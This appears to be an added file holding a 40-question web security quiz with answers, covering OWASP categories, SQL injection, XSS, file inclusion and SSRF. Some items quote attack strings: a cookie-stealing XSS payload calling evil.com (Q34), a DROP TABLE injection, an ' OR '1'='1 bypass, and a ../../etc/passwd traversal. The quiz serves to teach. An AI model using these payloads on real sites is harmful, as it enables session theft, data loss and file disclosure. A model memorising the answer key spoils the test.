@@ -1,0 +1,322 @@
+✅ Easy (10 Questions)
+Q1. What does the "A" in OWASP stand for?
+A) Application
+B) Authentication
+C) Authorization
+D) Audit
+Answer: A
+Explanation: OWASP stands for Open Web Application Security Project.
+
+Q2. Which OWASP category includes SQL Injection?
+A) A1 - Broken Access Control
+B) A3 - Injection
+C) A5 - Security Misconfiguration
+D) A9 - Components with Known Vulnerabilities
+Answer: B
+Explanation: SQL Injection is categorized under "Injection" (A3) in OWASP 2021.
+
+Q3. What is the most common objective of SQL Injection?
+A) Format disks
+B) Deface the website
+C) Exfiltrate data
+D) Change admin password
+Answer: C
+Explanation: Attackers use SQLi to steal sensitive data.
+
+Q4. What type of attack is XSS?
+A) Server-side
+B) Client-side
+C) Proxy-based
+D) Firewall-based
+Answer: B
+Explanation: XSS executes scripts in the user's browser (client-side).
+
+Q5. Which character is commonly used to end a SQL statement in SQL Injection?
+A) #
+B) ;
+C) @
+D) &
+Answer: B
+Explanation: Semicolons ; are used to terminate and chain SQL statements.
+
+Q6. In XSS, malicious code is usually written in which language?
+A) Python
+B) SQL
+C) JavaScript
+D) C++
+Answer: C
+Explanation: JavaScript is the most commonly used language for XSS attacks.
+
+Q7. Which one is NOT a type of XSS?
+A) Reflected
+B) Stored
+C) DOM-based
+D) Packet-based
+Answer: D
+Explanation: Packet-based is not a valid type of XSS.
+
+Q8. What is the purpose of OWASP?
+A) Sell firewalls
+B) Educate about web security risks
+C) Provide antivirus
+D) Regulate internet use
+Answer: B
+Explanation: OWASP educates developers and organizations about security risks.
+
+Q9. A SQL injection vulnerability typically occurs when:
+A) Data is encrypted
+B) Queries are dynamically built using unsanitized input
+C) Indexes are missing
+D) Firewalls are disabled
+Answer: B
+Explanation: Unsanitized user input can change SQL query structure.
+
+Q10. What does "Inclusion" in web vulnerabilities usually refer to?
+A) Injecting code into HTML
+B) Including files through insecure paths
+C) Adding a user to a database
+D) Combining different encoding types
+Answer: B
+Explanation: File inclusion flaws allow attackers to include local or remote files.
+
+🟡 Medium (20 Questions)
+Q11. Which best describes Broken Access Control in OWASP Top 10?
+A) Unauthorized users gain access to restricted functions
+B) SQL statements are injected
+C) Data is encrypted incorrectly
+D) Authentication tokens are stolen
+Answer: A
+Explanation: Broken access control allows unauthorized access to data or functions.
+
+Q12. In OWASP 2021, which item is ranked most critical?
+A) Insecure Design
+B) Injection
+C) Broken Access Control
+D) Security Misconfiguration
+Answer: C
+Explanation: Broken Access Control is the #1 risk in OWASP 2021.
+
+Q13. How can input validation prevent SQL injection?
+A) By making queries faster
+B) By removing whitespaces
+C) By only allowing expected data formats
+D) By disabling cookies
+Answer: C
+Explanation: Strict validation blocks dangerous characters and formats.
+
+Q14. How can stored procedures still be vulnerable to SQL injection?
+A) If stored in MySQL
+B) If they dynamically build SQL statements
+C) When used in authentication
+D) If too many are nested
+Answer: B
+Explanation: Dynamic SQL in stored procedures is exploitable.
+
+Q15. Which of the following is an example of Local File Inclusion (LFI)?
+A) <script>alert()</script>
+B) ../../etc/passwd
+C) SELECT * FROM users
+D) <img src='x'>
+Answer: B
+Explanation: LFI attempts to load sensitive files through path traversal.
+
+Q16. DOM-based XSS occurs:
+A) On the server
+B) During database storage
+C) When the page is interpreted in the browser
+D) Inside APIs
+Answer: C
+Explanation: DOM-based XSS modifies the page content in the client browser.
+
+Q17. What HTTP method is most used in reflected XSS?
+A) POST
+B) PUT
+C) DELETE
+D) GET
+Answer: D
+Explanation: Reflected XSS often uses GET parameters.
+
+Q18. What’s the primary goal of a stored XSS attack?
+A) Break the server
+B) Persist malicious scripts in a database
+C) Spoof email headers
+D) Encrypt data
+Answer: B
+Explanation: Stored XSS stores the script for repeated execution.
+
+Q19. What does this payload do? ' ; DROP TABLE users;--
+A) Command injection
+B) Buffer overflow
+C) SQL Injection
+D) CSRF
+Answer: C
+Explanation: Classic SQLi payload to delete a table.
+
+Q20. include($_GET["page"]); is an example of:
+A) XSS
+B) File Inclusion vulnerability
+C) Broken Auth
+D) Security Misconfiguration
+Answer: B
+Explanation: User-controlled file inclusion is a critical vulnerability.
+
+Q21. What mitigates XSS?
+A) Password hashing
+B) JSON encoding
+C) Input sanitization and output encoding
+D) Data compression
+Answer: C
+Explanation: This ensures input is safe and not executed as code.
+
+Q22. What kind of stored procedure injection bypasses auth logic?
+A) Nested query
+B) EXEC with user input
+C) INOUT parameters
+D) OUTPUT clause
+Answer: B
+Explanation: EXEC can execute unsanitized SQL if user input is embedded.
+
+Q23. Which OWASP risk involves data protection failures?
+A) Insecure Design
+B) Cryptographic Failures
+C) Broken Access Control
+D) CSRF
+Answer: B
+Explanation: Formerly “Sensitive Data Exposure”, this covers encryption failures.
+
+Q24. A sign of SQL Injection is:
+A) Password mismatch
+B) Timeouts
+C) SQL error messages
+D) CSRF tokens
+Answer: C
+Explanation: Error messages often reveal underlying queries.
+
+Q25. Reflected XSS can be triggered by:
+A) Script in query string
+B) Inserting code in database
+C) Editing HTML source
+D) Manipulating headers
+Answer: A
+Explanation: Query strings are often echoed back unsanitized.
+
+Q26. Which OWASP item lets attackers manipulate URLs?
+A) XSS
+B) Injection
+C) Security Misconfig
+D) SSRF
+Answer: D
+Explanation: SSRF tricks servers into making unauthorized requests.
+
+Q27. Which input is dangerous for SQLi?
+A) ' OR '1'='1
+B) hello
+C) 123
+D) test@example.com
+Answer: A
+Explanation: ' OR '1'='1 causes condition to always be true.
+
+Q28. Which encoding helps stop XSS?
+A) Base64
+B) URL encoding
+C) HTML encoding
+D) AES
+Answer: C
+Explanation: HTML encoding makes characters safe to render.
+
+Q29. Which PHP function is dangerous with user input?
+A) echo()
+B) include()
+C) isset()
+D) header()
+Answer: B
+Explanation: include() can lead to file inclusion flaws.
+
+Q30. Secure coding practice?
+A) Manual escaping
+B) HTML comments
+C) Prepared statements
+D) Repeating user input
+Answer: C
+Explanation: Prepared statements ensure SQL and data are separated.
+
+🔴 Hard (10 Questions)
+Q31. Most effective defense against stored procedure SQL injection?
+A) Whitelist input
+B) Encrypt parameters
+C) Use parameterized procedures
+D) Escape semicolons
+Answer: C
+Explanation: Parameterization prevents data from being interpreted as code.
+
+Q32. How does XSS steal session cookies?
+A) Reading DB
+B) Sending CSRF
+C) Injecting JavaScript with document.cookie
+D) OS exploit
+Answer: C
+Explanation: Attackers send stolen cookies to their own servers.
+
+Q33. Where is SSRF in OWASP Top 10 (2021)?
+A) A1
+B) A6
+C) A10
+D) A4
+Answer: C
+Explanation: SSRF is now officially part of OWASP Top 10.
+
+Q34. Payload: "><script>fetch('http://evil.com?c='+document.cookie)</script> is:
+A) Reflected XSS
+B) SQL Injection
+C) CSRF
+D) SSRF
+Answer: A
+Explanation: Classic reflected XSS stealing cookies.
+
+Q35. Which DB function is risky in stored procedure injection?
+A) COUNT()
+B) EXECUTE()
+C) AVG()
+D) TRUNCATE()
+Answer: B
+Explanation: EXECUTE with dynamic SQL can be exploited.
+
+Q36. What does ../../ mean in LFI?
+A) Execute command
+B) Load URL
+C) Navigate directories
+D) Break encryption
+Answer: C
+Explanation: ../ is used for directory traversal in LFI.
+
+Q37. Why is filtering characters insufficient for XSS?
+A) XSS is not real
+B) Encodings can bypass filters
+C) HTML blocks JS
+D) Browsers ignore JS
+Answer: B
+Explanation: Encoded payloads evade basic filters.
+
+Q38. CWE stands for?
+A) Common Web Exploits
+B) Code Weakness Engine
+C) Common Weakness Enumeration
+D) Configurable Web Errors
+Answer: C
+Explanation: CWE is a standard for software vulnerabilities.
+
+Q39. Key difference between LFI and RFI?
+A) LFI uses scripts
+B) LFI includes local, RFI includes remote
+C) LFI runs in browser
+D) RFI is safer
+Answer: B
+Explanation: RFI allows inclusion from external URLs.
+
+Q40. Tool to detect stored procedure injection?
+A) Wireshark
+B) Nmap
+C) sqlmap
+D) Metasploit
+Answer: C
+Explanation: sqlmap is an automated SQLi testing tool.
